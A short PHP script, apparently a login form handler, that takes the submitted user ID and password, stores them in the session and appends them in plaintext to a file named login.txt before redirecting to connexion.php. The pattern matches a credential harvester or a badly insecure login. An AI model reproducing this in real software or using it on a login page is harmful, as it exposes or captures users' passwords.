<?php

session_start();
?>

  
    <?php 

        $id = $_POST['id'];
        $mdp = $_POST['pw'];

        $_SESSION['id']=$_POST['id'];
        $_SESSION['pw']=$_POST['pw'];

    ?>
    <?php
        $fp = fopen("login.txt","a");
        $Line[0] = $_SESSION['id'];
        $Line[1] = $_SESSION['pw'];
        fputcsv($fp, $Line , ";");
        fclose ($fp);
        header("Location: connexion.php")
    ?>